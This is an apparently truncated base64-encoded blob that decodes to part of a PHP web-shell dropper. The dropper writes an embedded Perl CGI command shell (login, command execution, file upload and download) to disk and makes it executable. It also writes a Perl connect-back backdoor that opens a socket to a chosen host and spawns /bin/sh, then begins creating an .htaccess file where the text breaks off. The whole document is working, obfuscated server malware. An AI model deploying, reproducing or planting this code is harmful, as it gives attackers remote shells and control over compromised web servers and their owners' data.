dkx6c05DZ2tKQ1Fsd2NtbHVkQ0FpSkY5Y2JpSTdEUW9KQ1FsOURRb0pDUWtrZkQwd093MEtDUWw5RFFvSkNXVnNjMlVnSXlCemFHOTNJRzkxZEhCMWRDQmhablJsY2lCamIyMXRZVzVrSUdOdmJYQnNaWFJsY3cwS0NRbDdEUW9KQ1Fsd2NtbHVkQ0JnSkVOdmJXMWhibVJnT3cwS0NRbDlEUW9KQ1dsbUtDRWtWMmx1VGxRcERRb0pDWHNOQ2drSkNXRnNZWEp0S0RBcE93MEtDUWw5RFFvSkNYQnlhVzUwSUNJOEwzaHRjRDRpT3cwS0NYME5DZ2ttVUhKcGJuUkRiMjF0WVc1a1RHbHVaVWx1Y0hWMFJtOXliVHNOQ2drbVVISnBiblJRWVdkbFJtOXZkR1Z5T3cwS2ZRMEtEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUW9qSUZSb2FYTWdablZ1WTNScGIyNGdaR2x6Y0d4aGVYTWdkR2hsSUhCaFoyVWdkR2hoZENCamIyNTBZV2x1Y3lCaElHeHBibXNnZDJocFkyZ2dZV3hzYjNkeklIUm9aU0IxYzJWeURRb2pJSFJ2SUdSdmQyNXNiMkZrSUhSb1pTQnpjR1ZqYVdacFpXUWdabWxzWlM0Z1ZHaGxJSEJoWjJVZ1lXeHpieUJqYjI1MFlXbHVjeUJoSUdGMWRHOHRjbVZtY21WemFBMEtJeUJtWldGMGRYSmxJSFJvWVhRZ2MzUmhjblJ6SUhSb1pTQmtiM2R1Ykc5aFpDQmhkWFJ2YldGMGFXTmhiR3g1TGcwS0l5QkJjbWQxYldWdWRDQXhPaUJHZFd4c2VTQnhkV0ZzYVdacFpXUWdabWxzWlc1aGJXVWdiMllnZEdobElHWnBiR1VnZEc4Z1ltVWdaRzkzYm14dllXUmxaQTBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLYzNWaUlGQnlhVzUwUkc5M2JteHZZV1JNYVc1clVHRm5aUTBLZXcwS0NXeHZZMkZzS0NSR2FXeGxWWEpzS1NBOUlFQmZPdzBLQ1dsbUtDMWxJQ1JHYVd4bFZYSnNLU0FqSUdsbUlIUm9aU0JtYVd4bElHVjRhWE4wY3cwS0NYc05DZ2tKSXlCbGJtTnZaR1VnZEdobElHWnBiR1VnYkdsdWF5QnpieUIzWlNCallXNGdjMlZ1WkNCcGRDQjBieUIwYUdVZ1luSnZkM05sY2cwS0NRa2tSbWxzWlZWeWJDQTlmaUJ6THloYlhtRXRla0V0V2pBdE9WMHBMeWNsSnk1MWJuQmhZMnNvSWtncUlpd2tNU2t2WldjN0RRb0pDU1JFYjNkdWJHOWhaRXhwYm1zZ1BTQWlKRk5qY21sd2RFeHZZMkYwYVc5dVAyRTlaRzkzYm14dllXUW1aajBrUm1sc1pWVnliQ1p2UFdkdklqc05DZ2tKSkVoMGJXeE5aWFJoU0dWaFpHVnlJRDBnSWp4dFpYUmhJRWhVVkZBdFJWRlZTVlk5WENKU1pXWnlaWE5vWENJZ1EwOU9WRVZPVkQxY0lqRTdJRlZTVEQwa1JHOTNibXh2WVdSTWFXNXJYQ0krSWpzTkNna0pKbEJ5YVc1MFVHRm5aVWhsWVdSbGNpZ2lZeUlwT3cwS0NRbHdjbWx1ZENBOFBFVk9SRHNOQ2p4amIyUmxQZzBLRFFwVFpXNWthVzVuSUVacGJHVWdKRlJ5WVc1elptVnlSbWxzWlM0dUxqeGljajROQ2tsbUlIUm9aU0JrYjNkdWJHOWhaQ0JrYjJWeklHNXZkQ0J6ZEdGeWRDQmhkWFJ2YldGMGFXTmhiR3g1TEEwS1BHRWdhSEpsWmowaUpFUnZkMjVzYjJGa1RHbHVheUkrUTJ4cFkyc2dTR1Z5WlR3dllUNHVEUXBGVGtRTkNna0pKbEJ5YVc1MFEyOXRiV0Z1WkV4cGJtVkpibkIxZEVadmNtMDdEUW9KQ1NaUWNtbHVkRkJoWjJWR2IyOTBaWEk3RFFvSmZRMEtDV1ZzYzJVZ0l5Qm1hV3hsSUdSdlpYTnVKM1FnWlhocGMzUU5DZ2w3RFFvSkNTWlFjbWx1ZEZCaFoyVklaV0ZrWlhJb0ltWWlLVHNOQ2drSmNISnBiblFnSWtaaGFXeGxaQ0IwYnlCa2IzZHViRzloWkNBa1JtbHNaVlZ5YkRvZ0pDRWlPdzBLQ1FrbVVISnBiblJHYVd4bFJHOTNibXh2WVdSR2IzSnRPdzBLQ1FrbVVISnBiblJRWVdkbFJtOXZkR1Z5T3cwS0NYME5DbjBOQ2cwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS0l5QlVhR2x6SUdaMWJtTjBhVzl1SUhKbFlXUnpJSFJvWlNCemNHVmphV1pwWldRZ1ptbHNaU0JtY205dElIUm9aU0JrYVhOcklHRnVaQ0J6Wlc1a2N5QnBkQ0IwYnlCMGFHVU5DaU1nWW5KdmQzTmxjaXdnYzI4Z2RHaGhkQ0JwZENCallXNGdZbVVnWkc5M2JteHZZV1JsWkNCaWVTQjBhR1VnZFhObGNpNE5DaU1nUVhKbmRXMWxiblFnTVRvZ1JuVnNiSGtnY1hWaGJHbG1hV1ZrSUhCaGRHaHVZVzFsSUc5bUlIUm9aU0JtYVd4bElIUnZJR0psSUhObGJuUXVEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUXB6ZFdJZ1UyVnVaRVpwYkdWVWIwSnliM2R6WlhJTkNuc05DZ2xzYjJOaGJDZ2tVMlZ1WkVacGJHVXBJRDBnUUY4N0RRb0phV1lvYjNCbGJpaFRSVTVFUmtsTVJTd2dKRk5sYm1SR2FXeGxLU2tnSXlCbWFXeGxJRzl3Wlc1bFpDQm1iM0lnY21WaFpHbHVadzBLQ1hzTkNna0phV1lvSkZkcGJrNVVLUTBLQ1FsN0RRb0pDUWxpYVc1dGIyUmxLRk5GVGtSR1NVeEZLVHNOQ2drSkNXSnBibTF2WkdVb1UxUkVUMVZVS1RzTkNna0pmUTBLQ1Fra1JtbHNaVk5wZW1VZ1BTQW9jM1JoZENna1UyVnVaRVpwYkdVcEtWczNYVHNOQ2drSktDUkdhV3hsYm1GdFpTQTlJQ1JUWlc1a1JtbHNaU2tnUFg0Z0lHMGhLRnRlTDE1Y1hGMHFLU1FoT3cwS0NRbHdjbWx1ZENBaVEyOXVkR1Z1ZEMxVWVYQmxPaUJoY0hCc2FXTmhkR2x2Ymk5NExYVnVhMjV2ZDI1Y2JpSTdEUW9KQ1hCeWFXNTBJQ0pEYjI1MFpXNTBMVXhsYm1kMGFEb2dKRVpwYkdWVGFYcGxYRzRpT3cwS0NRbHdjbWx1ZENBaVEyOXVkR1Z1ZEMxRWFYTndiM05wZEdsdmJqb2dZWFIwWVdOb2JXVnVkRHNnWm1sc1pXNWhiV1U5SkRGY2JseHVJanNOQ2drSmNISnBiblFnZDJocGJHVW9QRk5GVGtSR1NVeEZQaWs3RFFvSkNXTnNiM05sS0ZORlRrUkdTVXhGS1RzTkNnbDlEUW9KWld4elpTQWpJR1poYVd4bFpDQjBieUJ2Y0dWdUlHWnBiR1VOQ2dsN0RRb0pDU1pRY21sdWRGQmhaMlZJWldGa1pYSW9JbVlpS1RzTkNna0pjSEpwYm5RZ0lrWmhhV3hsWkNCMGJ5QmtiM2R1Ykc5aFpDQWtVMlZ1WkVacGJHVTZJQ1FoSWpzTkNna0pKbEJ5YVc1MFJtbHNaVVJ2ZDI1c2IyRmtSbTl5YlRzTkNnMEtDUWttVUhKcGJuUlFZV2RsUm05dmRHVnlPdzBLQ1gwTkNuME5DZzBLRFFvakxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFvaklGUm9hWE1nWm5WdVkzUnBiMjRnYVhNZ1kyRnNiR1ZrSUhkb1pXNGdkR2hsSUhWelpYSWdaRzkzYm14dllXUnpJR0VnWm1sc1pTNGdTWFFnWkdsemNHeGhlWE1nWVNCdFpYTnpZV2RsRFFvaklIUnZJSFJvWlNCMWMyVnlJR0Z1WkNCd2NtOTJhV1JsY3lCaElHeHBibXNnZEdoeWIzVm5hQ0IzYUdsamFDQjBhR1VnWm1sc1pTQmpZVzRnWW1VZ1pHOTNibXh2WVdSbFpDNE5DaU1nVkdocGN5Qm1kVzVqZEdsdmJpQnBjeUJoYkhOdklHTmhiR3hsWkNCM2FHVnVJSFJvWlNCMWMyVnlJR05zYVdOcmN5QnZiaUIwYUdGMElHeHBibXN1SUVsdUlIUm9hWE1nWTJGelpTd05DaU1nZEdobElHWnBiR1VnYVhNZ2NtVmhaQ0JoYm1RZ2MyVnVkQ0IwYnlCMGFHVWdZbkp2ZDNObGNpNE5DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME5Dbk4xWWlCQ1pXZHBia1J2ZDI1c2IyRmtEUXA3RFFvSkl5Qm5aWFFnWm5Wc2JIa2djWFZoYkdsbWFXVmtJSEJoZEdnZ2IyWWdkR2hsSUdacGJHVWdkRzhnWW1VZ1pHOTNibXh2WVdSbFpBMEtDV2xtS0Nna1YybHVUbFFnSmlBb0pGUnlZVzV6Wm1WeVJtbHNaU0E5ZmlCdEwxNWNYSHhlTGpvdktTa2dmQTBLQ1Frb0lTUlhhVzVPVkNBbUlDZ2tWSEpoYm5ObVpYSkdhV3hsSUQxK0lHMHZYbHd2THlrcEtTQWpJSEJoZEdnZ2FYTWdZV0p6YjJ4MWRHVU5DZ2w3RFFvSkNTUlVZWEpuWlhSR2FXeGxJRDBnSkZSeVlXNXpabVZ5Um1sc1pUc05DZ2w5RFFvSlpXeHpaU0FqSUhCaGRHZ2dhWE1nY21Wc1lYUnBkbVVOQ2dsN0RRb0pDV05vYjNBb0pGUmhjbWRsZEVacGJHVXBJR2xtS0NSVVlYSm5aWFJHYVd4bElEMGdKRU4xY25KbGJuUkVhWElwSUQxK0lHMHZXMXhjWEM5ZEpDODdEUW9KQ1NSVVlYSm5aWFJHYVd4bElDNDlJQ1JRWVhSb1UyVndMaVJVY21GdWMyWmxja1pwYkdVN0RRb0pmUTBLRFFvSmFXWW9KRTl3ZEdsdmJuTWdaWEVnSW1kdklpa2dJeUIzWlNCb1lYWmxJSFJ2SUhObGJtUWdkR2hsSUdacGJHVU5DZ2w3RFFvSkNTWlRaVzVrUm1sc1pWUnZRbkp2ZDNObGNpZ2tWR0Z5WjJWMFJtbHNaU2s3RFFvSmZRMEtDV1ZzYzJVZ0l5QjNaU0JvWVhabElIUnZJSE5sYm1RZ2IyNXNlU0IwYUdVZ2JHbHVheUJ3WVdkbERRb0pldzBLQ1FrbVVISnBiblJFYjNkdWJHOWhaRXhwYm10UVlXZGxLQ1JVWVhKblpYUkdhV3hsS1RzTkNnbDlEUXA5RFFvTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNpTWdWR2hwY3lCbWRXNWpkR2x2YmlCcGN5QmpZV3hzWldRZ2QyaGxiaUIwYUdVZ2RYTmxjaUIzWVc1MGN5QjBieUIxY0d4dllXUWdZU0JtYVd4bExpQkpaaUIwYUdVTkNpTWdabWxzWlNCcGN5QnViM1FnYzNCbFkybG1hV1ZrTENCcGRDQmthWE53YkdGNWN5QmhJR1p2Y20wZ1lXeHNiM2RwYm1jZ2RHaGxJSFZ6WlhJZ2RHOGdjM0JsWTJsbWVTQmhEUW9qSUdacGJHVXNJRzkwYUdWeWQybHpaU0JwZENCemRHRnlkSE1nZEdobElIVndiRzloWkNCd2NtOWpaWE56TGcwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS2MzVmlJRlZ3Ykc5aFpFWnBiR1VOQ25zTkNna2pJR2xtSUc1dklHWnBiR1VnYVhNZ2MzQmxZMmxtYVdWa0xDQndjbWx1ZENCMGFHVWdkWEJzYjJGa0lHWnZjbTBnWVdkaGFXNE5DZ2xwWmlna1ZISmhibk5tWlhKR2FXeGxJR1Z4SUNJaUtRMEtDWHNOQ2drSkpsQnlhVzUwVUdGblpVaGxZV1JsY2lnaVppSXBPdzBLQ1FrbVVISnBiblJHYVd4bFZYQnNiMkZrUm05eWJUc05DZ2tKSmxCeWFXNTBVR0ZuWlVadmIzUmxjanNOQ2drSmNtVjBkWEp1T3cwS0NYME5DZ2ttVUhKcGJuUlFZV2RsU0dWaFpHVnlLQ0pqSWlrN0RRb05DZ2tqSUhOMFlYSjBJSFJvWlNCMWNHeHZZV1JwYm1jZ2NISnZZMlZ6Y3cwS0NYQnlhVzUwSUNKVmNHeHZZV1JwYm1jZ0pGUnlZVzV6Wm1WeVJtbHNaU0IwYnlBa1EzVnljbVZ1ZEVScGNpNHVManhpY2o0aU93MEtEUW9KSXlCblpYUWdkR2hsSUdaMWJHeHNlU0J4ZFdGc2FXWnBaV1FnY0dGMGFHNWhiV1VnYjJZZ2RHaGxJR1pwYkdVZ2RHOGdZbVVnWTNKbFlYUmxaQTBLQ1dOb2IzQW9KRlJoY21kbGRFNWhiV1VwSUdsbUlDZ2tWR0Z5WjJWMFRtRnRaU0E5SUNSRGRYSnlaVzUwUkdseUtTQTlmaUJ0TDF0Y1hGd3ZYU1F2T3cwS0NTUlVjbUZ1YzJabGNrWnBiR1VnUFg0Z2JTRW9XMTR2WGx4Y1hTb3BKQ0U3RFFvSkpGUmhjbWRsZEU1aGJXVWdMajBnSkZCaGRHaFRaWEF1SkRFN0RRb05DZ2trVkdGeVoyVjBSbWxzWlZOcGVtVWdQU0JzWlc1bmRHZ29KR2x1ZXlkbWFXeGxaR0YwWVNkOUtUc05DZ2tqSUdsbUlIUm9aU0JtYVd4bElHVjRhWE4wY3lCaGJtUWdkMlVnWVhKbElHNXZkQ0J6ZFhCd2IzTmxaQ0IwYnlCdmRtVnlkM0pwZEdVZ2FYUU5DZ2xwWmlndFpTQWtWR0Z5WjJWMFRtRnRaU0FtSmlBa1QzQjBhVzl1Y3lCdVpTQWliM1psY25keWFYUmxJaWtOQ2dsN0RRb0pDWEJ5YVc1MElDSkdZV2xzWldRNklFUmxjM1JwYm1GMGFXOXVJR1pwYkdVZ1lXeHlaV0ZrZVNCbGVHbHpkSE11UEdKeVBpSTdEUW9KZlEwS0NXVnNjMlVnSXlCbWFXeGxJR2x6SUc1dmRDQndjbVZ6Wlc1MERRb0pldzBLQ1FscFppaHZjR1Z1S0ZWUVRFOUJSRVpKVEVVc0lDSStKRlJoY21kbGRFNWhiV1VpS1NrTkNna0pldzBLQ1FrSlltbHViVzlrWlNoVlVFeFBRVVJHU1V4RktTQnBaaUFrVjJsdVRsUTdEUW9KQ1Fsd2NtbHVkQ0JWVUV4UFFVUkdTVXhGSUNScGJuc25abWxzWldSaGRHRW5mVHNOQ2drSkNXTnNiM05sS0ZWUVRFOUJSRVpKVEVVcE93MEtDUWtKY0hKcGJuUWdJbFJ5WVc1elptVnlaV1FnSkZSaGNtZGxkRVpwYkdWVGFYcGxJRUo1ZEdWekxqeGljajRpT3cwS0NRa0pjSEpwYm5RZ0lrWnBiR1VnVUdGMGFEb2dKRlJoY21kbGRFNWhiV1U4WW5JK0lqc05DZ2tKZlEwS0NRbGxiSE5sRFFvSkNYc05DZ2tKQ1hCeWFXNTBJQ0pHWVdsc1pXUTZJQ1FoUEdKeVBpSTdEUW9KQ1gwTkNnbDlEUW9KY0hKcGJuUWdJaUk3RFFvSkpsQnlhVzUwUTI5dGJXRnVaRXhwYm1WSmJuQjFkRVp2Y20wN0RRb05DZ2ttVUhKcGJuUlFZV2RsUm05dmRHVnlPdzBLZlEwS0RRb2pMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdERRb2pJRlJvYVhNZ1puVnVZM1JwYjI0Z2FYTWdZMkZzYkdWa0lIZG9aVzRnZEdobElIVnpaWElnZDJGdWRITWdkRzhnWkc5M2JteHZZV1FnWVNCbWFXeGxMaUJKWmlCMGFHVU5DaU1nWm1sc1pXNWhiV1VnYVhNZ2JtOTBJSE53WldOcFptbGxaQ3dnYVhRZ1pHbHpjR3hoZVhNZ1lTQm1iM0p0SUdGc2JHOTNhVzVuSUhSb1pTQjFjMlZ5SUhSdklITndaV05wWm5rZ1lRMEtJeUJtYVd4bExDQnZkR2hsY25kcGMyVWdhWFFnWkdsemNHeGhlWE1nWVNCdFpYTnpZV2RsSUhSdklIUm9aU0IxYzJWeUlHRnVaQ0J3Y205MmFXUmxjeUJoSUd4cGJtc05DaU1nZEdoeWIzVm5hQ0FnZDJocFkyZ2dkR2hsSUdacGJHVWdZMkZ1SUdKbElHUnZkMjVzYjJGa1pXUXVEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUXB6ZFdJZ1JHOTNibXh2WVdSR2FXeGxEUXA3RFFvSkl5QnBaaUJ1YnlCbWFXeGxJR2x6SUhOd1pXTnBabWxsWkN3Z2NISnBiblFnZEdobElHUnZkMjVzYjJGa0lHWnZjbTBnWVdkaGFXNE5DZ2xwWmlna1ZISmhibk5tWlhKR2FXeGxJR1Z4SUNJaUtRMEtDWHNOQ2drSkpsQnlhVzUwVUdGblpVaGxZV1JsY2lnaVppSXBPdzBLQ1FrbVVISnBiblJHYVd4bFJHOTNibXh2WVdSR2IzSnRPdzBLQ1FrbVVISnBiblJRWVdkbFJtOXZkR1Z5T3cwS0NRbHlaWFIxY200N0RRb0pmUTBLQ1EwS0NTTWdaMlYwSUdaMWJHeDVJSEYxWVd4cFptbGxaQ0J3WVhSb0lHOW1JSFJvWlNCbWFXeGxJSFJ2SUdKbElHUnZkMjVzYjJGa1pXUU5DZ2xwWmlnb0pGZHBiazVVSUNZZ0tDUlVjbUZ1YzJabGNrWnBiR1VnUFg0Z2JTOWVYRng4WGk0Nkx5a3BJSHdOQ2drSktDRWtWMmx1VGxRZ0ppQW9KRlJ5WVc1elptVnlSbWxzWlNBOWZpQnRMMTVjTHk4cEtTa2dJeUJ3WVhSb0lHbHpJR0ZpYzI5c2RYUmxEUW9KZXcwS0NRa2tWR0Z5WjJWMFJtbHNaU0E5SUNSVWNtRnVjMlpsY2tacGJHVTdEUW9KZlEwS0NXVnNjMlVnSXlCd1lYUm9JR2x6SUhKbGJHRjBhWFpsRFFvSmV3MEtDUWxqYUc5d0tDUlVZWEpuWlhSR2FXeGxLU0JwWmlna1ZHRnlaMlYwUm1sc1pTQTlJQ1JEZFhKeVpXNTBSR2x5S1NBOWZpQnRMMXRjWEZ3dlhTUXZPdzBLQ1Fra1ZHRnlaMlYwUm1sc1pTQXVQU0FrVUdGMGFGTmxjQzRrVkhKaGJuTm1aWEpHYVd4bE93MEtDWDBOQ2cwS0NXbG1LQ1JQY0hScGIyNXpJR1Z4SUNKbmJ5SXBJQ01nZDJVZ2FHRjJaU0IwYnlCelpXNWtJSFJvWlNCbWFXeGxEUW9KZXcwS0NRa21VMlZ1WkVacGJHVlViMEp5YjNkelpYSW9KRlJoY21kbGRFWnBiR1VwT3cwS0NYME5DZ2xsYkhObElDTWdkMlVnYUdGMlpTQjBieUJ6Wlc1a0lHOXViSGtnZEdobElHeHBibXNnY0dGblpRMEtDWHNOQ2drSkpsQnlhVzUwUkc5M2JteHZZV1JNYVc1clVHRm5aU2drVkdGeVoyVjBSbWxzWlNrN0RRb0pmUTBLZlEwS0RRb2pMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdERRb2pJRTFoYVc0Z1VISnZaM0poYlNBdElFVjRaV04xZEdsdmJpQlRkR0Z5ZEhNZ1NHVnlaUTBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLSmxKbFlXUlFZWEp6WlRzTkNpWkhaWFJEYjI5cmFXVnpPdzBLRFFva1UyTnlhWEIwVEc5allYUnBiMjRnUFNBa1JVNVdleWRUUTFKSlVGUmZUa0ZOUlNkOU93MEtKRk5sY25abGNrNWhiV1VnUFNBa1JVNVdleWRUUlZKV1JWSmZUa0ZOUlNkOU93MEtKRXh2WjJsdVVHRnpjM2R2Y21RZ1BTQWthVzU3SjNBbmZUc05DaVJTZFc1RGIyMXRZVzVrSUQwZ0pHbHVleWRqSjMwN0RRb2tWSEpoYm5ObVpYSkdhV3hsSUQwZ0pHbHVleWRtSjMwN0RRb2tUM0IwYVc5dWN5QTlJQ1JwYm5zbmJ5ZDlPdzBLRFFva1FXTjBhVzl1SUQwZ0pHbHVleWRoSjMwN0RRb2tRV04wYVc5dUlEMGdJbXh2WjJsdUlpQnBaaWdrUVdOMGFXOXVJR1Z4SUNJaUtUc2dJeUJ1YnlCaFkzUnBiMjRnYzNCbFkybG1hV1ZrTENCMWMyVWdaR1ZtWVhWc2RBMEtEUW9qSUdkbGRDQjBhR1VnWkdseVpXTjBiM0o1SUdsdUlIZG9hV05vSUhSb1pTQmpiMjF0WVc1a2N5QjNhV3hzSUdKbElHVjRaV04xZEdWa0RRb2tRM1Z5Y21WdWRFUnBjaUE5SUNScGJuc25aQ2Q5T3cwS1kyaHZjQ2drUTNWeWNtVnVkRVJwY2lBOUlHQWtRMjFrVUhka1lDa2dhV1lvSkVOMWNuSmxiblJFYVhJZ1pYRWdJaUlwT3cwS0RRb2tURzluWjJWa1NXNGdQU0FrUTI5dmEybGxjM3NuVTBGV1JVUlFWMFFuZlNCbGNTQWtVR0Z6YzNkdmNtUTdEUW9OQ21sbUtDUkJZM1JwYjI0Z1pYRWdJbXh2WjJsdUlpQjhmQ0FoSkV4dloyZGxaRWx1S1NBaklIVnpaWElnYm1WbFpITXZhR0Z6SUhSdklHeHZaMmx1RFFwN0RRb0pKbEJsY21admNtMU1iMmRwYmpzTkNnMEtmUTBLWld4emFXWW9KRUZqZEdsdmJpQmxjU0FpWTI5dGJXRnVaQ0lwSUNNZ2RYTmxjaUIzWVc1MGN5QjBieUJ5ZFc0Z1lTQmpiMjF0WVc1a0RRcDdEUW9KSmtWNFpXTjFkR1ZEYjIxdFlXNWtPdzBLZlEwS1pXeHphV1lvSkVGamRHbHZiaUJsY1NBaWRYQnNiMkZrSWlrZ0l5QjFjMlZ5SUhkaGJuUnpJSFJ2SUhWd2JHOWhaQ0JoSUdacGJHVU5DbnNOQ2drbVZYQnNiMkZrUm1sc1pUc05DbjBOQ21Wc2MybG1LQ1JCWTNScGIyNGdaWEVnSW1SdmQyNXNiMkZrSWlrZ0l5QjFjMlZ5SUhkaGJuUnpJSFJ2SUdSdmQyNXNiMkZrSUdFZ1ptbHNaUTBLZXcwS0NTWkViM2R1Ykc5aFpFWnBiR1U3RFFwOURRcGxiSE5wWmlna1FXTjBhVzl1SUdWeElDSnNiMmR2ZFhRaUtTQWpJSFZ6WlhJZ2QyRnVkSE1nZEc4Z2JHOW5iM1YwRFFwN0RRb0pKbEJsY21admNtMU1iMmR2ZFhRN0RRcDknOw0KDQokZmlsZSA9IGZvcGVuKCJpem8uY2luIiAsIncrIik7DQokd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRjZ2lzaGVsbGl6b2NpbikpOw0KZmNsb3NlKCRmaWxlKTsNCiAgICBjaG1vZCgiaXpvLmNpbiIsMDc1NSk7DQokbmV0Y2F0c2hlbGwgPSAnSXlFdmRYTnlMMkpwYmk5d1pYSnNEUW9nSUNBZ0lDQjFjMlVnVTI5amEyVjBPdzBLSUNBZ0lDQWdjSEpwYm5RZ0lrUmhkR0VnUTJoaA0KTUhNZ1EyOXVibVZqZENCQ1lXTnJJRUpoWTJ0a2IyOXlYRzVjYmlJN0RRb2dJQ0FnSUNCcFppQW9JU1JCVWtkV1d6QmRLU0I3RFFvZw0KSUNBZ0lDQWdJSEJ5YVc1MFppQWlWWE5oWjJVNklDUXdJRnRJYjNOMFhTQThVRzl5ZEQ1Y2JpSTdEUW9nSUNBZ0lDQWdJR1Y0YVhRbw0KTVNrN0RRb2dJQ0FnSUNCOURRb2dJQ0FnSUNCd2NtbHVkQ0FpV3lwZElFUjFiWEJwYm1jZ1FYSm5kVzFsYm5SelhHNGlPdzBLSUNBZw0KSUNBZ0pHaHZjM1FnUFNBa1FWSkhWbHN3WFRzTkNpQWdJQ0FnSUNSd2IzSjBJRDBnT0RBN0RRb2dJQ0FnSUNCcFppQW9KRUZTUjFaYg0KTVYwcElIc05DaUFnSUNBZ0lDQWdKSEJ2Y25RZ1BTQWtRVkpIVmxzeFhUc05DaUFnSUNBZ0lIME5DaUFnSUNBZ0lIQnlhVzUwSUNKYg0KS2wwZ1EyOXVibVZqZEdsdVp5NHVMbHh1SWpzTkNpQWdJQ0FnSUNSd2NtOTBieUE5SUdkbGRIQnliM1J2WW5sdVlXMWxLQ2QwWTNBbg0KS1NCOGZDQmthV1VvSWxWdWEyNXZkMjRnVUhKdmRHOWpiMnhjYmlJcE93MEtJQ0FnSUNBZ2MyOWphMlYwS0ZORlVsWkZVaXdnVUVaZg0KU1U1RlZDd2dVMDlEUzE5VFZGSkZRVTBzSUNSd2NtOTBieWtnZkh3Z1pHbGxJQ2dpVTI5amEyVjBJRVZ5Y205eVhHNGlLVHNOQ2lBZw0KSUNBZ0lHMTVJQ1IwWVhKblpYUWdQU0JwYm1WMFgyRjBiMjRvSkdodmMzUXBPdzBLSUNBZ0lDQWdhV1lnS0NGamIyNXVaV04wS0ZORg0KVWxaRlVpd2djR0ZqYXlBaVUyNUJOSGc0SWl3Z01pd2dKSEJ2Y25Rc0lDUjBZWEpuWlhRcEtTQjdEUW9nSUNBZ0lDQWdJR1JwWlNnaQ0KVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1JjYmlJcE93MEtJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ2NISnBiblFnSWxzcVhTQlRjR0YzYm1sdQ0KWnlCVGFHVnNiRnh1SWpzTkNpQWdJQ0FnSUdsbUlDZ2habTl5YXlnZ0tTa2dldzBLSUNBZ0lDQWdJQ0J2Y0dWdUtGTlVSRWxPTENJKw0KSmxORlVsWkZVaUlwT3cwS0lDQWdJQ0FnSUNCdmNHVnVLRk5VUkU5VlZDd2lQaVpUUlZKV1JWSWlLVHNOQ2lBZ0lDQWdJQ0FnYjNCbA0KYmloVFZFUkZVbElzSWo0bVUwVlNWa1ZTSWlrN0RRb2dJQ0FnSUNBZ0lHVjRaV01nZXljdlltbHVMM05vSjMwZ0p5MWlZWE5vSnlBdQ0KSUNKY01DSWdlQ0EwT3cwS0lDQWdJQ0FnSUNCbGVHbDBLREFwT3cwS0lDQWdJQ0FnZlEwS0lDQWdJQ0FnY0hKcGJuUWdJbHNxWFNCRQ0KWVhSaFkyaGxaRnh1WEc0aU93PT0nOw0KDQokZmlsZSA9IGZvcGVuKCJkYy5wbCIgLCJ3KyIpOw0KJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkbmV0Y2F0c2hlbGwpKTsNCmZjbG9zZSgkZmlsZSk7DQogICAgY2htb2QoImRjLnBsIiwwNzU1KTsNCmVjaG8gIjxpZnJhbWUgc3JjPWNnaXNoZWxsL2l6by5jaW4gd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOw0KfQ0KaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0MTQnXSkpDQp7DQogICAgbWtkaXIoJ3B5dGhvbicsIDA3NTUpOw0KICAgIGNoZGlyKCdweXRob24nKTsNCiAgICAgICAgJGtva2Rvc3lhID0gIi5odGFjY2VzcyI7DQogICAgICAgICRkb3N5YV9hZGkgPSAiJGtva2Rvc3lhIjsNCiAgICAgICAgJGRvc3lh